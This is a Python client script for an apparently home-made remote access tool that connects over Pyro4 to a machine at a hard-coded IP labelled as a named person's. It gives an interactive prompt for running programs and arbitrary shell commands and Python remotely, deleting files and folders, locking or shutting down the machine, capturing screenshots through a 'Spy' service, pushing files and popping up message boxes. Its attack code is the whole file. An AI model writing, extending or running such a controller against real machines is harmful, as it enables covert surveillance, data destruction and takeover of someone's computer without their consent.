from binascii import unhexlify
import Pyro4
from PIL import Image
import numpy as np
import pyautogui as gui
import os
import base64
from os import remove, system


liam_ip = "10.4.52.59"
ip = liam_ip
port = 3333

helloWorld = Pyro4.core.Proxy(f'PYRO:HelloWorld@{ip}:{port}')
execute = Pyro4.core.Proxy(f'PYRO:Execute@{ip}:{port}')
keybind = Pyro4.core.Proxy(f'PYRO:Keybind@{ip}:{port}')
download = Pyro4.core.Proxy(f'PYRO:Download@{ip}:{port}')
files = Pyro4.core.Proxy(f'PYRO:Files@{ip}:{port}')
spy = Pyro4.core.Proxy(f'PYRO:Spy@{ip}:{port}')
python = Pyro4.core.Proxy(f'PYRO:Python@{ip}:{port}')
msgbox = Pyro4.core.Proxy(f'PYRO:MessageBox@{ip}:{port}')

print(f'Connected to {ip}:{port}!')

while True:
    cmd = input('>> ')
    if cmd == 'exit' or cmd == 'quit':
        break
    elif cmd == 'start':
        program = input(">> >> ")
        execute.start(program)
    elif cmd == 'shutdown':
        execute.shutdown()
    elif cmd == 'custShell':
        shell = input(">> >> ")
        execute.custom(shell)
    elif cmd == 'close':
        keybind.close()
    elif cmd == 'saveClose':
        keybind.save_close()
    elif cmd == 'closeTab':
        keybind.close_tab()
    elif cmd == 'lock':
        keybind.lock()
    elif cmd == 'changeDesk':
        direc = input(">> >> ")
        keybind.change_desktop(direc)
    elif cmd == 'dyt':
        url = input(">> >> ")
        path = input(">> >> >> ")
        download.youtube(url, path)
    elif cmd == 'rawFile':
        url = input(">> >> ")
        path = input(">> >> >> ")
        try:
            download.raw_file(url, path)
        except Exception as e:
            print(f'Error: {e}')
    elif cmd == 'listFiles':
        print(f'Files in current directory: {files.list()}')
    elif cmd == 'delete':
        file = input(">> >> ")
        files.delete(file)
    elif cmd == 'deleteDir':
        direct = input(">> >> ")
        files.delete_folder(direct)
    elif cmd == 'createDir':
        direct = input(">> >> ")
        files.create_folder(direct)
    elif cmd == 'rename':
        old = input(">> >> ")
        new = input(">> >> >> ")
        files.rename(old, new)
    elif cmd == 'rename':
        old = input(">> >> ")
        new = input(">> >> >> ")
        files.rename(old, new)
    elif cmd == 'screenshot':
        byts = base64.b64decode(spy.screenshot())
        with open('screenshot.png', 'wb') as f:
            f.write(byts)
            f.close()
        Image.open('screenshot.png').show()
        remove('screenshot.png')
    elif cmd == 'cls':
        system('cls')
    elif cmd == 'sendFile':
        byts = base64.b64encode(open(input(">> >> "), 'rb').read()).decode()
        path = input(">> >> >> ")
        spy.send_file(byts, path)
    elif cmd == 'python':
        script = input(">> >> ")
        python.runscript(script)
    elif cmd == 'message':
        text = input(">> >> ")
        title = input(">> >> ")
        type = input(">> >> ")

        msgbox.show(text, title, int(type))
    elif cmd == "runscript":
        print(os.getcwd())
        script_name = input(">> >> ")
        with open(f'scripts/{script_name}', 'r') as f:
            python.runscript(f.read())
    else:
        print(f'"{cmd}" is notm a recognized command.')